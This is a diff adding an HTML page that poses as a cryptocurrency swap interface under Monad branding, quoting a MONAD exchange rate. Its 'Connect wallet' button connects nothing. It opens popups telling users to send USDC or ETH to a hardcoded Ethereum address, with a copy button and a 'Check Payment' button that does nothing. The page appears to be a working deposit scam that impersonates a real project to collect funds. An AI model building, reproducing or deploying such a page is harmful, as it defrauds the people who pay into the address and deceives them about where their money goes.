@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <title>Swap Interface</title>
+</head>
+<body class="bg-gray-100">
+    <div class="container mx-auto p-6">
+        <!-- Header -->
+        <div class="flex justify-between items-center mb-6">
+            <h1 class="text-2xl font-bold text-blue-600"><img src="https://cdn.prod.website-files.com/667c57e6f9254a4b6d914440/66956efeb01de969bd7b8abc_Logo%20Horizontal.svg" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 921px; height: 42px; margin: 20.5px 0px; width: 224px;" alt="Monad | The Most Performant EVM-Compatible Layer 1 Blockchain" jsname="kn3ccd" aria-hidden="false"></h1>
+            <!-- Connect Button -->
+		<button id="connectButton" class="bg-blue-500 text-white px-4 py-2 rounded" onclick="showPhantomPopup()">Connect</button>
+        </div>
+
+        <!-- Swap Section -->
+        <div class="bg-white rounded-lg shadow-md p-6">
+            <h2 class="text-lg font-semibold">Swap</h2>
+
+            <div class="mt-4">
+                <div class="flex justify-between items-center mb-2">
+                    <label class="text-sm">Sell</label>
+                    <select id="sellCurrency" class="border p-1 rounded" onchange="updateConnectButton()">
+                        <option value="USDC">USDC</option>
+                        <option value="ETH">ETH</option>
+                    </select>
+                </div>
+                <input type="number" id="sellAmount" placeholder="100" class="border p-2 rounded w-full" oninput="calculateMonad()" />
+                <div class="text-sm text-gray-500" id="sellValue">$100.00</div>
+            </div>
+
+            <div class="flex justify-center my-4">
+                <button class="bg-gray-200 w-12 h-12 rounded-full flex items-center justify-center">⬇️</button>
+            </div>
+
+            <div class="mt-4">
+                <div class="flex justify-between items-center mb-2">
+                    <label class="text-sm">Buy</label>
+                    <select class="border p-1 rounded">
+                        <option>MONAD</option>
+                        
+                    </select>
+                </div>
+                <input type="number" id="buyAmount" placeholder="20843.8" class="border p-2 rounded w-full" />
+                <div class="text-sm text-gray-500">$99.60</div>
+            </div>
+
+            <button id="connectButton" class="bg-blue-500 text-white w-full py-2 rounded mt-4" onclick="showPopup()">Connect wallet</button>
+
+            <div class="text-center text-sm text-gray-500 mt-4">
+                1 MONAD = 0.00479759 USDC ($0.00478)
+            </div>
+        </div>
+
+        <!-- Note Section -->
+        <div class="bg-white rounded-lg shadow-md mt-4 p-4">
+            <div class="flex justify-between items-center">
+                <span class="font-semibold">Introducing Unichain <span class="text-blue-500">New</span></span>
+            </div>
+            <p class="text-sm text-gray-500 mt-2">Faster swaps. Lower fees. Unichain is the home for DeFi.</p>
+        </div>
+    </div>
+
+    <!-- Popups -->
+<div id="popupUSDC" class="fixed inset-0 bg-gray-800 bg-opacity-50 flex items-center justify-center hidden">
+    <div class="bg-white p-6 rounded-lg shadow-lg">
+        <h2 class="text-lg font-bold">Scan the QR code, pay and add coins.</h2>
+        <center><p class="mt-2"><b>USDC</b> Ethereum (ERC-20) Information</p></center>
+		<center><p><img src="USDCQRPay.png" alt="Creat Coin" width="200" height="200" class="me-2"></p></center>
+					<center><pre>0x786F854113D2F739DB09544C8E15aba97A2b18C0</pre>
+					<button type="button" class="btn btn-primary" id="copy-button" onclick="copyText()">Copy</button></center>
+					<center><p class="mt-2">Use <b>USDC-ERC20</b> on the <b>Ethereum</b> Blockchain</p></center>
+		<img height="50" src="loading.gif" width="50" style="object-fit: contain; border-radius: 14px; z-index: 1;">
+        <button class="mt-4 bg-blue-500 text-white px-4 py-2 rounded" onclick="closePopup('popupUSDC')">Close</button>
+		<button class="mt-4 bg-green-500 text-white px-4 py-2 rounded" >Check Payment</button>
+    </div>
+</div>
+
+<div id="popupETH" class="fixed inset-0 bg-gray-800 bg-opacity-50 flex items-center justify-center hidden">
+    <div class="bg-white p-6 rounded-lg shadow-lg">
+        <h2 class="text-lg font-bold">ETH Information</h2>
+        <center><p class="mt-2"></p></center>
+		<center><p><img src="USDCQRPay.png" alt="Creat Coin" width="200" height="200" class="me-2"></p></center>
+					<center><pre>0x786F854113D2F739DB09544C8E15aba97A2b18C0</pre>
+					<button type="button" class="btn btn-primary" id="copy-button" onclick="copyText()">Copy</button></center>
+					<center><p class="mt-2">Ethereum (ERC-20)</p></center>
+		<img height="50" src="loading.gif" width="50" style="object-fit: contain; border-radius: 14px; z-index: 1;">
+        <button class="mt-4 bg-blue-500 text-white px-4 py-2 rounded" onclick="closePopup('popupETH')">Close</button>
+		<button class="mt-4 bg-green-500 text-white px-4 py-2 rounded" >Check Payment</button>
+    </div>
+</div>
+<!-- Popup for Phantom Wallet Connection -->
+<div id="popupPhantom" class="fixed inset-0 bg-gray-800 bg-opacity-50 flex items-center justify-center hidden">
+    <div class="bg-white p-6 rounded-lg shadow-lg">
+        <h2 class="text-lg font-bold">Connect Wallet</h2>
+        <p class="mt-2"><img src="phantom-f2e35007b9e5.webp" alt="Phantom Wallet" width="30" height="30" class="me-2" style="display: inline;">
+                        <span>Phantom</span></p>
+						<p>Haven't got a wallet? <a>Get started</a></p>
+        <button class="mt-4 bg-blue-500 text-white px-4 py-2 rounded" onclick="closePopup('popupPhantom')">Close</button>
+    </div>
+</div>
+
+<script>
+  function copyText() {
+    var text = "0x786F854113D2F739DB09544C8E15aba97A2b18C0";
+    navigator.clipboard.writeText(text).then(function() {
+      console.log("Text copied to clipboard");
+    }, function(err) {
+      console.error("Could not copy text: ", err);
+    });
+  }
+</script>
+
+<!-- Bootstrap JS and dependencies -->
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
+
+<script>
+    function calculateMonad() {
+        const sellAmount = document.getElementById('sellAmount').value;
+        const exchangeRate = 20843.8; // Example exchange rate for MONAD
+        const monadAmount = (sellAmount * exchangeRate).toFixed(2);
+        document.getElementById('buyAmount').value = monadAmount;
+    }
+
+    function updateConnectButton() {
+        const selectedCurrency = document.getElementById('sellCurrency').value;
+        const connectButton = document.getElementById('connectButton');
+        connectButton.setAttribute('href', selectedCurrency === 'ETH' ? '#popupETH' : '#popupUSDC');
+    }
+
+    function showPopup() {
+        const selectedCurrency = document.getElementById('sellCurrency').value;
+        const popupId = selectedCurrency === 'ETH' ? 'popupETH' : 'popupUSDC';
+        openPopup(popupId);
+    }
+
+    function openPopup(popupId) {
+        document.getElementById(popupId).classList.remove('hidden');
+    }
+
+    function closePopup(popupId) {
+        document.getElementById(popupId).classList.add('hidden');
+    }
+	
+	 function showPhantomPopup() {
+        openPopup('popupPhantom');
+    }
+
+    function openPopup(popupId) {
+        document.getElementById(popupId).classList.remove('hidden');
+    }
+
+    function closePopup(popupId) {
+        document.getElementById(popupId).classList.add('hidden');
+    }
+</script>
+
+
+
+</body>
+</html>
